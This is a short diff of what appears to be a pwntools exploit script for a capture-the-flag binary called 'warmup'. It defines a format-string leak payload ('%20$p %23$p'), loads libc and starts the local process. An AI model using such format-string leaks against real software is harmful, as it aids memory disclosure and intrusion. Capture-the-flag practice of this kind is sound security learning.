@@ -42,4 +42,8 @@ leakAddrStr=b"%20$p %23$p"
 
 # Starting ELF
 print("ESTABLISHING LIBC")
-libc = ELF("./libc.so.6",checksec=False)
+libc = ELF("libc.so.6")
+
+# Start Process
+p = process("./warmup")
+p.recv()
